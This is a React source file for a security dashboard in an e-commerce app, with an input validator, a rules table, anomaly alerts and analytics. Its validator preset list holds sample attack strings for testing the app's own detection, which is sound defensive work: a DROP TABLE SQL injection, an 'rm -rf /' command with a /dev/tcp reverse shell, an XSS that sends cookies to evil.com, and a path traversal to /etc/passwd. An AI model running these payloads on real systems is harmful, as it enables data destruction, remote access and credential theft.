import { useState, useEffect, useCallback } from 'react'
import { guardrailsValidationApi, guardrailsRulesApi, guardrailsAnomalyApi, guardrailsAnalyticsApi } from '../api/index.js'
import { useToast } from '../store/ToastContext.jsx'

const ACTION_META = {
  block: { label: 'BLOCK', color: '#DC2626', bg: '#FEF2F2', border: '#FECACA' },
  flag:  { label: 'FLAG',  color: '#D97706', bg: '#FFFBEB', border: '#FDE68A' },
  pass:  { label: 'PASS',  color: '#059669', bg: '#ECFDF5', border: '#A7F3D0' },
}

const SEV_META = {
  critical: { label: 'Critical', color: '#DC2626', bg: '#FEF2F2' },
  high:     { label: 'High',     color: '#D97706', bg: '#FFFBEB' },
  medium:   { label: 'Medium',   color: '#4F46E5', bg: '#EEF2FF' },
  low:      { label: 'Low',      color: '#6B7280', bg: '#F3F4F6' },
}

const ALERT_STATUS_META = {
  open:           { label: 'Open',           color: '#DC2626' },
  acknowledged:   { label: 'Acknowledged',   color: '#D97706' },
  resolved:       { label: 'Resolved',       color: '#059669' },
  false_positive: { label: 'False Positive', color: '#6B7280' },
}

const PRESETS = [
  { label: 'SQL Injection',      context: 'text',   input: "1=1 UNION SELECT * FROM users; DROP TABLE orders--" },
  { label: 'Command Injection',  context: 'text',   input: "$(rm -rf /); bash -i >& /dev/tcp/10.0.0.1/4444" },
  { label: 'XSS',               context: 'text',   input: "<script>fetch('https://evil.com?c='+document.cookie)</script>" },
  { label: 'Path Traversal',    context: 'text',   input: "../../etc/passwd" },
  { label: 'Clean Search',      context: 'search', input: "whey protein chocolate 2kg" },
]

function ActionBadge({ action, score }) {
  const m = ACTION_META[action] || ACTION_META.pass
  return (
    <div style={{ display: 'flex', alignItems: 'center', gap: 12 }}>
      <span style={{
        display: 'inline-block', fontWeight: 900, fontSize: '1.1rem',
        padding: '6px 18px', borderRadius: 8, letterSpacing: '.06em',
        background: m.bg, color: m.color, border: `2px solid ${m.border}`,
      }}>
        {m.label}
      </span>
      <span style={{
        fontVariantNumeric: 'tabular-nums', fontWeight: 800, fontSize: '1.1rem',
        color: m.color,
      }}>
        Score: {score ?? '—'}
      </span>
    </div>
  )
}

function SevBadge({ severity }) {
  const m = SEV_META[severity] || SEV_META.low
  return (
    <span style={{
      display: 'inline-block', fontSize: '0.7rem', fontWeight: 700,
      padding: '2px 8px', borderRadius: 20, background: m.bg, color: m.color,
    }}>
      {m.label}
    </span>
  )
}

function RuleTypeBadge({ type }) {
  const colors = { regex: ['#EEF2FF','#4F46E5'], rate_limit: ['#FFFBEB','#D97706'], threshold: ['#FEF2F2','#DC2626'], zscore: ['#F0FDF4','#059669'], range: ['#F8FAFC','#6B7280'] }
  const [bg, color] = colors[type] || colors.range
  return (
    <span style={{
      display: 'inline-block', fontSize: '0.68rem', fontWeight: 700,
      padding: '2px 7px', borderRadius: 4, background: bg, color, fontFamily: 'monospace',
    }}>
      {type}
    </span>
  )
}

export default function Guardrails() {
  const toast = useToast()
  const [tab, setTab] = useState('validator')

  // Validator
  const [vContext, setVContext] = useState('text')
  const [vInput, setVInput] = useState('')
  const [vContactFields, setVContactFields] = useState({ phone: '', email: '', pincode: '', name: '' })
  const [vAmount, setVAmount] = useState('')
  const [vAmountCtx, setVAmountCtx] = useState('order')
  const [vResult, setVResult] = useState(null)
  const [vLoading, setVLoading] = useState(false)

  // Rules
  const [rules, setRules] = useState([])
  const [rulesLoading, setRulesLoading] = useState(false)
  const [toggling, setToggling] = useState(null)

  // Anomaly alerts
  const [alerts, setAlerts] = useState([])
  const [alertsLoading, setAlertsLoading] = useState(false)
  const [scanning, setScanning] = useState(false)
  const [alertFilter, setAlertFilter] = useState('open')
  const [resolveModal, setResolveModal] = useState(null)
  const [resolveNote, setResolveNote] = useState('')
  const [resolveSubmitting, setResolveSubmitting] = useState(false)

  // Analytics
  const [analytics, setAnalytics] = useState(null)
  const [analyticsLoading, setAnalyticsLoading] = useState(false)

  const loadRules = useCallback(async () => {
    setRulesLoading(true)
    try {
      const r = await guardrailsRulesApi.list()
      setRules(r.data.rules || r.data || [])
    } catch { toast('Could not load rules', 'error') }
    finally { setRulesLoading(false) }
  }, [])

  const loadAlerts = useCallback(async (status) => {
    setAlertsLoading(true)
    try {
      const r = await guardrailsAnomalyApi.alerts({ status, limit: 50 })
      setAlerts(r.data.alerts || [])
    } catch { toast('Could not load alerts', 'error') }
    finally { setAlertsLoading(false) }
  }, [])

  const loadAnalytics = useCallback(async () => {
    setAnalyticsLoading(true)
    try {
      const r = await guardrailsAnalyticsApi.overview()
      setAnalytics(r.data)
    } catch { /* silent */ }
    finally { setAnalyticsLoading(false) }
  }, [])

  useEffect(() => {
    if (tab === 'rules') loadRules()
    if (tab === 'alerts') loadAlerts(alertFilter)
    if (tab === 'analytics') loadAnalytics()
  }, [tab])

  useEffect(() => {
    if (tab === 'alerts') loadAlerts(alertFilter)
  }, [alertFilter])

  async function validate() {
    setVLoading(true)
    setVResult(null)
    try {
      let r
      if (vContext === 'contact') {
        r = await guardrailsValidationApi.contact(vContactFields)
      } else if (vContext === 'amount') {
        r = await guardrailsValidationApi.amount({ amount: Number(vAmount), context: vAmountCtx })
      } else if (vContext === 'search') {
        r = await guardrailsValidationApi.search({ query: vInput })
      } else {
        r = await guardrailsValidationApi.text({ text: vInput, context: vContext })
      }
      setVResult(r.data)
    } catch (e) {
      toast(e.response?.data?.detail || 'Validation failed', 'error')
    } finally {
      setVLoading(false)
    }
  }

  function applyPreset(p) {
    setVContext(p.context)
    setVInput(p.input)
    setVResult(null)
  }

  async function toggleRule(rule) {
    setToggling(rule.id)
    try {
      await guardrailsRulesApi.toggle(rule.id)
      setRules(prev => prev.map(r => r.id === rule.id ? { ...r, is_active: !r.is_active } : r))
      toast(`Rule "${rule.name}" ${rule.is_active ? 'disabled' : 'enabled'}`, 'success')
    } catch {
      toast('Could not toggle rule', 'error')
    } finally {
      setToggling(null)
    }
  }

  async function runScan() {
    setScanning(true)
    try {
      const r = await guardrailsAnomalyApi.scan('full')
      const d = r.data
      toast(`Scan complete — ${d.new_alerts_saved ?? 0} new alert(s) from ${d.detectors_run ?? 8} detectors`, 'success')
      loadAlerts(alertFilter)
    } catch {
      toast('Scan failed', 'error')
    } finally {
      setScanning(false)
    }
  }

  async function acknowledgeAlert(id) {
    try {
      await guardrailsAnomalyApi.acknowledge(id)
      toast('Alert acknowledged', 'success')
      loadAlerts(alertFilter)
    } catch { toast('Could not acknowledge', 'error') }
  }

  async function submitResolve() {
    if (!resolveModal) return
    setResolveSubmitting(true)
    try {
      const payload = { resolved_by: 'ops_team', resolution_note: resolveNote || 'Reviewed by ops team' }
      if (resolveModal.type === 'fp') {
        await guardrailsAnomalyApi.falsePositive(resolveModal.alert.id, payload)
        toast('Marked as false positive', 'success')
      } else {
        await guardrailsAnomalyApi.resolve(resolveModal.alert.id, payload)
        toast('Alert resolved', 'success')
      }
      setResolveModal(null)
      setResolveNote('')
      loadAlerts(alertFilter)
    } catch {
      toast('Could not complete action', 'error')
    } finally {
      setResolveSubmitting(false)
    }
  }

  const v = analytics?.validation || {}
  const an = analytics?.anomaly || {}
  const rl = analytics?.rules || {}

  return (
    <div className="page">
      <div className="container">

        {/* Page header */}
        <div style={s.pageHeader}>
          <div>
            <h1 style={{ marginBottom: 4 }}>Security &amp; Guardrails</h1>
            <p style={{ color: 'var(--muted)', fontSize: '0.875rem' }}>
              Input validation · Injection detection · Anomaly scanning · Runtime rules
            </p>
          </div>
          <div style={{ display: 'flex', gap: 8 }}>
            <span style={s.portChip}>localhost:8010</span>
          </div>
        </div>

        {/* Threshold legend */}
        <div style={s.thresholdBar}>
          {[
            { label: 'PASS', sub: 'score 0–39', bg: '#059669', flex: 2 },
            { label: 'FLAG', sub: 'score 40–79', bg: '#D97706', flex: 2 },
            { label: 'BLOCK', sub: 'score 80–100', bg: '#DC2626', flex: 2 },
          ].map(t => (
            <div key={t.label} style={{ background: t.bg, flex: t.flex, padding: '6px 14px',
              color: '#fff', textAlign: 'center', fontSize: '0.72rem', fontWeight: 700 }}>
              {t.label}<br /><span style={{ fontWeight: 400, fontSize: '0.65rem' }}>{t.sub}</span>
            </div>
          ))}
        </div>

        {/* Tabs */}
        <div style={s.tabBar}>
          {[
            ['validator', 'Live Validator'],
            ['rules', 'Rules (10)'],
            ['alerts', 'Anomaly Alerts'],
            ['analytics', 'Analytics'],
          ].map(([key, label]) => (
            <button key={key} style={{ ...s.tab, ...(tab === key ? s.tabActive : {}) }} onClick={() => setTab(key)}>
              {label}
            </button>
          ))}
        </div>

        {/* ── Validator Tab ── */}
        {tab === 'validator' && (
          <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 20, alignItems: 'start' }}>

            {/* Input panel */}
            <div style={s.card}>
              <div style={s.cardHead}>Input</div>
              <div style={{ padding: '16px 18px' }}>

                {/* Context selector */}
                <div className="form-group">
                  <label style={{ fontSize: '0.8rem', fontWeight: 600 }}>Context</label>
                  <div style={{ display: 'flex', gap: 6, flexWrap: 'wrap', marginTop: 6 }}>
                    {['text','search','contact','amount'].map(c => (
                      <button key={c} style={{ ...s.chip, ...(vContext === c ? s.chipActive : {}) }}
                        onClick={() => { setVContext(c); setVResult(null) }}>
                        {c}
                      </button>
                    ))}
                  </div>
                </div>

                {/* Preset attack buttons */}
                {(vContext === 'text' || vContext === 'search') && (
                  <div style={{ marginBottom: 14 }}>
                    <div style={{ fontSize: '0.75rem', fontWeight: 600, color: 'var(--muted)', marginBottom: 6 }}>
                      Quick presets
                    </div>
                    <div style={{ display: 'flex', gap: 5, flexWrap: 'wrap' }}>
                      {PRESETS.filter(p => p.context === vContext || (vContext === 'text' && p.context !== 'search')).map(p => (
                        <button key={p.label} style={s.presetBtn} onClick={() => applyPreset(p)}>
                          {p.label}
                        </button>
                      ))}
                    </div>
                  </div>
                )}

                {/* Inputs */}
                {(vContext === 'text' || vContext === 'search') && (
                  <div className="form-group">
                    <label style={{ fontSize: '0.8rem' }}>{vContext === 'search' ? 'Query' : 'Text input'}</label>
                    <textarea
                      className="input"
                      style={{ height: 100, resize: 'vertical', fontFamily: 'monospace', fontSize: '0.82rem' }}
                      value={vInput}
                      onChange={e => setVInput(e.target.value)}
                      placeholder={vContext === 'search' ? 'Enter a search query…' : 'Enter any text to validate…'}
                    />
                  </div>
                )}

                {vContext === 'contact' && (
                  <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 12 }}>
                    {[
                      { key: 'phone',   label: 'Phone',   placeholder: '9876543210' },
                      { key: 'email',   label: 'Email',   placeholder: 'user@example.com' },
                      { key: 'pincode', label: 'Pincode', placeholder: '400069' },
                      { key: 'name',    label: 'Name',    placeholder: 'Anjali Patel' },
                    ].map(f => (
                      <div key={f.key} className="form-group">
                        <label style={{ fontSize: '0.8rem' }}>{f.label}</label>
                        <input className="input" placeholder={f.placeholder}
                          value={vContactFields[f.key]}
                          onChange={e => setVContactFields(prev => ({ ...prev, [f.key]: e.target.value }))} />
                      </div>
                    ))}
                  </div>
                )}

                {vContext === 'amount' && (
                  <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 12 }}>
                    <div className="form-group">
                      <label style={{ fontSize: '0.8rem' }}>Amount (₹)</label>
                      <input className="input" type="number" placeholder="e.g. 2499"
                        value={vAmount} onChange={e => setVAmount(e.target.value)} />
                    </div>
                    <div className="form-group">
                      <label style={{ fontSize: '0.8rem' }}>Context</label>
                      <select className="input" value={vAmountCtx} onChange={e => setVAmountCtx(e.target.value)}>
                        <option value="order">Order</option>
                        <option value="refund">Refund</option>
                        <option value="product">Product price</option>
                      </select>
                    </div>
                  </div>
                )}

                {/* Dangerous test suggestions for amount */}
                {vContext === 'amount' && (
                  <div style={{ marginBottom: 14 }}>
                    <div style={{ fontSize: '0.75rem', fontWeight: 600, color: 'var(--muted)', marginBottom: 6 }}>Quick tests</div>
                    <div style={{ display: 'flex', gap: 5, flexWrap: 'wrap' }}>
                      {[
                        { label: 'Negative (–500)', amount: '-500', ctx: 'order' },
                        { label: 'Zero (₹0)', amount: '0', ctx: 'order' },
                        { label: 'Over ₹1cr', amount: '15000000', ctx: 'order' },
                        { label: 'Normal (₹2499)', amount: '2499', ctx: 'order' },
                      ].map(p => (
                        <button key={p.label} style={s.presetBtn}
                          onClick={() => { setVAmount(p.amount); setVAmountCtx(p.ctx); setVResult(null) }}>
                          {p.label}
                        </button>
                      ))}
                    </div>
                  </div>
                )}

                <button
                  className="btn btn-primary"
                  style={{ width: '100%', marginTop: 8 }}
                  disabled={vLoading}
                  onClick={validate}
                >
                  {vLoading ? 'Validating…' : 'Validate'}
                </button>
              </div>
            </div>

            {/* Result panel */}
            <div style={s.card}>
              <div style={s.cardHead}>Result</div>
              <div style={{ padding: '16px 18px' }}>
                {!vResult && !vLoading && (
                  <div style={{ textAlign: 'center', padding: '40px 0', color: 'var(--muted)', fontSize: '0.85rem' }}>
                    <div style={{ fontSize: '2.5rem', marginBottom: 10 }}>🔍</div>
                    Submit an input to see the validation result
                  </div>
                )}
                {vLoading && (
                  <div style={{ textAlign: 'center', padding: '40px 0' }}>
                    <div className="spinner" style={{ margin: '0 auto' }} />
                  </div>
                )}
                {vResult && (
                  <div>
                    <div style={{ marginBottom: 16 }}>
                      <ActionBadge action={vResult.action} score={vResult.risk_score} />
                    </div>

                    {vResult.processing_time_ms !== undefined && (
                      <div style={{ fontSize: '0.72rem', color: 'var(--muted)', marginBottom: 14 }}>
                        Processed in {Number(vResult.processing_time_ms).toFixed(1)} ms
                        · {vResult.violations?.length ?? 0} violation(s)
                        {vResult.validation_id && <> · ID: <code style={{ fontSize: '0.7em' }}>{vResult.validation_id.slice(0, 8)}</code></>}
                      </div>
                    )}

                    {/* Violations */}
                    {vResult.violations?.length > 0 ? (
                      <div style={{ display: 'flex', flexDirection: 'column', gap: 10 }}>
                        <div style={{ fontSize: '0.8rem', fontWeight: 700, marginBottom: 2 }}>Violations</div>
                        {vResult.violations.map((v, i) => {
                          const sm = SEV_META[v.severity] || SEV_META.low
                          return (
                            <div key={i} style={{
                              borderLeft: `3px solid ${sm.color}`, paddingLeft: 12,
                              background: sm.bg, borderRadius: '0 6px 6px 0', padding: '10px 12px',
                            }}>
                              <div style={{ display: 'flex', alignItems: 'center', gap: 8, marginBottom: 4 }}>
                                <SevBadge severity={v.severity} />
                                <code style={{ fontSize: '0.8rem', fontWeight: 700 }}>{v.rule_name}</code>
                              </div>
                              <div style={{ fontSize: '0.8rem', color: 'var(--muted)', marginBottom: v.matched?.length ? 6 : 0 }}>
                                {v.message}
                              </div>
                              {v.matched?.length > 0 && (
                                <div style={{ display: 'flex', gap: 5, flexWrap: 'wrap' }}>
                                  {v.matched.map((m, j) => (
                                    <code key={j} style={{
                                      fontSize: '0.72rem', background: 'rgba(0,0,0,.08)',
                                      padding: '2px 6px', borderRadius: 3,
                                    }}>
                                      {m}
                                    </code>
                                  ))}
                                </div>
                              )}
                            </div>
                          )
                        })}
                      </div>
                    ) : (
                      <div style={{
                        textAlign: 'center', padding: '20px', background: '#ECFDF5',
                        borderRadius: 8, color: '#059669', fontWeight: 600, fontSize: '0.85rem',
                      }}>
                        No violations detected
                      </div>
                    )}
                  </div>
                )}
              </div>
            </div>
          </div>
        )}

        {/* ── Rules Tab ── */}
        {tab === 'rules' && (
          <div>
            {rulesLoading ? (
              <div className="spinner-wrap"><div className="spinner" /></div>
            ) : (
              <div style={{ overflowX: 'auto' }}>
                <table style={s.table}>
                  <thead>
                    <tr>
                      {['Rule', 'Type', 'Target', 'Severity', 'Action', 'Triggers', 'Status'].map(h => (
                        <th key={h} style={s.th}>{h}</th>
                      ))}
                    </tr>
                  </thead>
                  <tbody>
                    {rules.map(r => (
                      <tr key={r.id} style={{ ...s.tr, opacity: r.is_active ? 1 : 0.5 }}>
                        <td style={s.td}>
                          <div style={{ fontWeight: 700, fontSize: '0.85rem', fontFamily: 'monospace' }}>{r.name}</div>
                          <div style={{ fontSize: '0.72rem', color: 'var(--muted)', marginTop: 2, maxWidth: 220 }}>{r.description}</div>
                        </td>
                        <td style={s.td}><RuleTypeBadge type={r.rule_type} /></td>
                        <td style={{ ...s.td, fontSize: '0.8rem', color: 'var(--muted)' }}>{r.target_type}</td>
                        <td style={s.td}><SevBadge severity={r.severity} /></td>
                        <td style={s.td}>
                          <span style={{
                            fontSize: '0.72rem', fontWeight: 700, padding: '2px 8px', borderRadius: 4,
                            ...( r.action === 'block' ? { background: '#FEF2F2', color: '#DC2626' }
                              : r.action === 'flag'  ? { background: '#FFFBEB', color: '#D97706' }
                              : { background: '#EEF2FF', color: '#4F46E5' }),
                          }}>
                            {r.action}
                          </span>
                        </td>
                        <td style={{ ...s.td, fontVariantNumeric: 'tabular-nums', fontWeight: 700, color: r.trigger_count > 0 ? '#4F46E5' : 'var(--muted)' }}>
                          {r.trigger_count ?? 0}
                        </td>
                        <td style={s.td}>
                          <button
                            className={r.is_active ? 'btn btn-ghost btn-sm' : 'btn btn-outline btn-sm'}
                            style={{ minWidth: 72 }}
                            disabled={toggling === r.id}
                            onClick={() => toggleRule(r)}
                          >
                            {toggling === r.id ? '…' : r.is_active ? 'Disable' : 'Enable'}
                          </button>
                        </td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>
            )}
          </div>
        )}

        {/* ── Anomaly Alerts Tab ── */}
        {tab === 'alerts' && (
          <div>
            <div style={s.filterRow}>
              <span style={{ fontSize: '0.8rem', color: 'var(--muted)', fontWeight: 600 }}>Status:</span>
              {['open','acknowledged','resolved','false_positive'].map(st => (
                <button key={st} style={{ ...s.chip, ...(alertFilter === st ? s.chipActive : {}) }}
                  onClick={() => setAlertFilter(st)}>
                  {ALERT_STATUS_META[st]?.label}
                </button>
              ))}
              <button
                className="btn btn-primary btn-sm"
                style={{ marginLeft: 'auto' }}
                disabled={scanning}
                onClick={runScan}
              >
                {scanning ? 'Scanning…' : 'Run Anomaly Scan'}
              </button>
            </div>

            {alertsLoading ? (
              <div className="spinner-wrap"><div className="spinner" /></div>
            ) : alerts.length === 0 ? (
              <div className="empty-state" style={{ padding: '48px 0' }}>
                <div style={{ fontSize: '2.5rem', marginBottom: 12 }}>
                  {alertFilter === 'open' ? '✅' : '📋'}
                </div>
                <h3>{alertFilter === 'open' ? 'No open anomaly alerts' : 'No alerts found'}</h3>
                {alertFilter === 'open' && (
                  <p style={{ color: 'var(--muted)', fontSize: '0.85rem', marginTop: 8 }}>
                    Click "Run Anomaly Scan" to check all 8 detectors against the current dataset.
                  </p>
                )}
              </div>
            ) : (
              <div style={{ display: 'flex', flexDirection: 'column', gap: 0 }}>
                {alerts.map(a => {
                  const sm = SEV_META[a.severity] || SEV_META.low
                  return (
                    <div key={a.id} style={{
                      ...s.alertRow,
                      borderLeft: `3px solid ${sm.color}`,
                    }}>
                      <div style={{ flex: 1, minWidth: 0 }}>
                        <div style={{ display: 'flex', alignItems: 'center', gap: 8, marginBottom: 3 }}>
                          <SevBadge severity={a.severity} />
                          <span style={{ fontWeight: 700, fontSize: '0.85rem' }}>{a.title || a.anomaly_type}</span>
                          <span style={{
                            fontSize: '0.7rem', fontWeight: 700, padding: '2px 6px', borderRadius: 4,
                            background: '#EEF2FF', color: '#4F46E5', fontVariantNumeric: 'tabular-nums',
                          }}>
                            Risk: {a.risk_score}
                          </span>
                        </div>
                        <div style={{ fontSize: '0.78rem', color: 'var(--muted)', marginBottom: 3 }}>
                          {a.description}
                        </div>
                        <div style={{ display: 'flex', gap: 14, fontSize: '0.72rem', color: 'var(--muted)' }}>
                          <span>Type: <strong style={{ color: 'var(--text)' }}>{a.anomaly_type}</strong></span>
                          {a.entity_id && <span>Entity: <code style={{ fontSize: '0.75em' }}>{a.entity_id.slice(0,8)}…</code></span>}
                          <span>{new Date(a.created_at).toLocaleString()}</span>
                        </div>
                        {a.evidence && Object.keys(a.evidence).length > 0 && (
                          <div style={{ marginTop: 6, display: 'flex', gap: 8, flexWrap: 'wrap' }}>
                            {Object.entries(a.evidence).slice(0, 4).map(([k, v]) => (
                              <span key={k} style={{
                                fontSize: '0.7rem', background: 'var(--ground)',
                                border: '1px solid var(--border)', borderRadius: 4,
                                padding: '1px 7px', fontFamily: 'monospace',
                              }}>
                                {k}: {String(v)}
                              </span>
                            ))}
                          </div>
                        )}
                      </div>
                      <div style={{ display: 'flex', gap: 6, flexShrink: 0, flexDirection: 'column' }}>
                        {a.status === 'open' && (
                          <button className="btn btn-ghost btn-sm" onClick={() => acknowledgeAlert(a.id)}>
                            Acknowledge
                          </button>
                        )}
                        {(a.status === 'open' || a.status === 'acknowledged') && (
                          <>
                            <button className="btn btn-outline btn-sm"
                              onClick={() => { setResolveModal({ alert: a, type: 'resolve' }); setResolveNote('') }}>
                              Resolve
                            </button>
                            <button className="btn btn-ghost btn-sm" style={{ color: 'var(--muted)', fontSize: '0.75rem' }}
                              onClick={() => { setResolveModal({ alert: a, type: 'fp' }); setResolveNote('') }}>
                              False Positive
                            </button>
                          </>
                        )}
                        {a.status === 'resolved' && (
                          <span style={{ fontSize: '0.75rem', color: '#059669', fontWeight: 600 }}>Resolved</span>
                        )}
                        {a.status === 'false_positive' && (
                          <span style={{ fontSize: '0.75rem', color: 'var(--muted)', fontWeight: 600 }}>False Positive</span>
                        )}
                      </div>
                    </div>
                  )
                })}
              </div>
            )}
          </div>
        )}

        {/* ── Analytics Tab ── */}
        {tab === 'analytics' && (
          <div>
            {analyticsLoading ? (
              <div className="spinner-wrap"><div className="spinner" /></div>
            ) : analytics ? (
              <div style={{ display: 'flex', flexDirection: 'column', gap: 20 }}>

                {/* Validation stats */}
                <div style={s.card}>
                  <div style={s.cardHead}>Validation Layer</div>
                  <div style={{ padding: '16px 18px' }}>
                    <div style={{ display: 'grid', gridTemplateColumns: 'repeat(4,1fr)', gap: 12 }}>
                      {[
                        { label: 'Total Requests',  value: v.total_requests ?? v.total ?? 0,        color: '#4F46E5' },
                        { label: 'Blocked (24h)',    value: v.blocked_last_24h ?? v.blocked ?? 0,   color: '#DC2626' },
                        { label: 'Flagged (24h)',    value: v.flagged_last_24h ?? v.flagged ?? 0,   color: '#D97706' },
                        { label: 'Passed (24h)',     value: v.passed_last_24h ?? v.passed ?? 0,    color: '#059669' },
                      ].map(st => (
                        <div key={st.label} style={s.statCard}>
                          <span style={{ fontSize: '1.75rem', fontWeight: 800, color: st.color, fontVariantNumeric: 'tabular-nums' }}>
                            {st.value}
                          </span>
                          <div style={{ fontSize: '0.75rem', color: 'var(--muted)', marginTop: 4 }}>{st.label}</div>
                        </div>
                      ))}
                    </div>
                    {v.top_triggered && (
                      <div style={{ marginTop: 14, fontSize: '0.82rem' }}>
                        Top triggered rule: <strong style={{ color: '#4F46E5' }}>{v.top_triggered.name || v.top_triggered}</strong>
                        {v.top_triggered.count !== undefined && ` (${v.top_triggered.count}×)`}
                      </div>
                    )}
                  </div>
                </div>

                {/* Anomaly stats */}
                <div style={s.card}>
                  <div style={s.cardHead}>Anomaly Detection Layer</div>
                  <div style={{ padding: '16px 18px' }}>
                    <div style={{ display: 'grid', gridTemplateColumns: 'repeat(4,1fr)', gap: 12 }}>
                      {[
                        { label: 'Total Alerts',  value: an.total_alerts ?? 0,  color: '#4F46E5' },
                        { label: 'Open',          value: an.open_alerts  ?? 0,  color: '#DC2626' },
                        { label: 'Avg Risk Score',value: Math.round(an.avg_risk_score ?? 0), color: '#D97706' },
                        { label: 'Active Rules',  value: rl.total_active ?? 0,  color: '#059669' },
                      ].map(st => (
                        <div key={st.label} style={s.statCard}>
                          <span style={{ fontSize: '1.75rem', fontWeight: 800, color: st.color, fontVariantNumeric: 'tabular-nums' }}>
                            {st.value}
                          </span>
                          <div style={{ fontSize: '0.75rem', color: 'var(--muted)', marginTop: 4 }}>{st.label}</div>
                        </div>
                      ))}
                    </div>
                    {an.by_severity && (
                      <div style={{ marginTop: 14 }}>
                        <div style={{ fontSize: '0.78rem', fontWeight: 600, marginBottom: 8 }}>By Severity</div>
                        <div style={{ display: 'flex', gap: 10 }}>
                          {Object.entries(an.by_severity).map(([sev, cnt]) => {
                            const m = SEV_META[sev] || SEV_META.low
                            return (
                              <div key={sev} style={{
                                flex: 1, background: m.bg, borderRadius: 8, padding: '8px 12px', textAlign: 'center',
                              }}>
                                <div style={{ fontWeight: 800, fontSize: '1.1rem', color: m.color, fontVariantNumeric: 'tabular-nums' }}>{cnt}</div>
                                <div style={{ fontSize: '0.7rem', color: m.color, fontWeight: 600, marginTop: 2 }}>{sev}</div>
                              </div>
                            )
                          })}
                        </div>
                      </div>
                    )}
                  </div>
                </div>

              </div>
            ) : (
              <div className="empty-state" style={{ padding: '48px 0' }}>
                <div style={{ fontSize: '2rem', marginBottom: 10 }}>📊</div>
                <h3>Analytics unavailable</h3>
              </div>
            )}
          </div>
        )}

      </div>

      {/* ── Resolve / False-Positive Modal ── */}
      {resolveModal && (
        <div style={s.overlay} onClick={() => setResolveModal(null)}>
          <div style={s.modalBox} onClick={e => e.stopPropagation()}>
            <h2 style={{ fontSize: '1.1rem', marginBottom: 4 }}>
              {resolveModal.type === 'fp' ? 'Mark as False Positive' : 'Resolve Alert'}
            </h2>
            <p style={{ color: 'var(--muted)', fontSize: '0.8rem', marginBottom: 18 }}>
              {resolveModal.alert.title || resolveModal.alert.anomaly_type}
            </p>
            <div className="form-group">
              <label>Resolution note</label>
              <textarea className="input" style={{ height: 80, resize: 'vertical' }}
                value={resolveNote}
                onChange={e => setResolveNote(e.target.value)}
                placeholder={resolveModal.type === 'fp' ? 'Why is this a false positive?' : 'What action was taken?'}
              />
            </div>
            <div style={{ display: 'flex', gap: 10, justifyContent: 'flex-end', marginTop: 8 }}>
              <button className="btn btn-ghost" onClick={() => setResolveModal(null)}>Cancel</button>
              <button className="btn btn-primary" disabled={resolveSubmitting} onClick={submitResolve}>
                {resolveSubmitting ? 'Saving…' : resolveModal.type === 'fp' ? 'Mark False Positive' : 'Resolve'}
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  )
}

const s = {
  pageHeader: {
    display: 'flex', alignItems: 'flex-start', justifyContent: 'space-between',
    marginBottom: 16, flexWrap: 'wrap', gap: 12,
  },
  portChip: {
    fontFamily: 'monospace', fontSize: '0.72rem', fontWeight: 700,
    padding: '5px 12px', borderRadius: 6, background: '#0D1117', color: '#58A6FF',
    border: '1px solid #30363D',
  },
  thresholdBar: {
    display: 'flex', borderRadius: 8, overflow: 'hidden', marginBottom: 20,
  },
  tabBar: {
    display: 'flex', gap: 0, borderBottom: '2px solid var(--border)', marginBottom: 24,
  },
  tab: {
    padding: '10px 20px', border: 'none', background: 'none',
    fontSize: '0.9rem', fontWeight: 600, color: 'var(--muted)',
    borderBottom: '2px solid transparent', marginBottom: -2,
    cursor: 'pointer', transition: 'color .15s, border-color .15s',
  },
  tabActive: {
    color: 'var(--primary)', borderBottomColor: 'var(--primary)',
  },
  card: {
    background: 'var(--surface)', border: '1px solid var(--border)',
    borderRadius: 'var(--radius-lg)', overflow: 'hidden',
  },
  cardHead: {
    padding: '11px 18px', borderBottom: '1px solid var(--border)',
    fontWeight: 700, fontSize: '0.85rem', background: 'var(--ground)',
  },
  filterRow: {
    display: 'flex', alignItems: 'center', gap: 8, flexWrap: 'wrap', marginBottom: 16,
  },
  chip: {
    padding: '5px 14px', borderRadius: 20, border: '1.5px solid var(--border)',
    background: 'var(--surface)', fontSize: '0.8rem', fontWeight: 600,
    color: 'var(--muted)', cursor: 'pointer', transition: 'all .15s',
  },
  chipActive: {
    background: 'var(--primary)', color: '#fff', borderColor: 'var(--primary)',
  },
  presetBtn: {
    padding: '4px 10px', borderRadius: 6, border: '1px solid var(--border)',
    background: 'var(--ground)', fontSize: '0.74rem', fontWeight: 600,
    color: 'var(--muted)', cursor: 'pointer',
  },
  table: {
    width: '100%', borderCollapse: 'collapse', fontSize: '0.875rem',
    background: 'var(--surface)', borderRadius: 'var(--radius-lg)',
    overflow: 'hidden', border: '1px solid var(--border)',
  },
  th: {
    textAlign: 'left', padding: '10px 14px',
    fontSize: '0.7rem', letterSpacing: '.06em', textTransform: 'uppercase',
    color: 'var(--muted)', fontWeight: 700,
    background: 'var(--ground)', borderBottom: '2px solid var(--border)',
  },
  td: {
    padding: '12px 14px', borderBottom: '1px solid var(--border)', verticalAlign: 'middle',
  },
  tr: { transition: 'background .1s' },
  alertRow: {
    display: 'flex', alignItems: 'flex-start', gap: 16,
    padding: '14px 18px',
    background: 'var(--surface)',
    borderBottom: '1px solid var(--border)',
  },
  statCard: {
    background: 'var(--ground)', border: '1px solid var(--border)',
    borderRadius: 'var(--radius)', padding: '14px 16px',
  },
  overlay: {
    position: 'fixed', inset: 0, background: 'rgba(0,0,0,.45)',
    display: 'flex', alignItems: 'center', justifyContent: 'center',
    zIndex: 1000, padding: 20,
  },
  modalBox: {
    background: 'var(--surface)', borderRadius: 'var(--radius-lg)',
    padding: '28px 32px', width: '100%', maxWidth: 480,
    boxShadow: 'var(--shadow-lg)',
  },
}
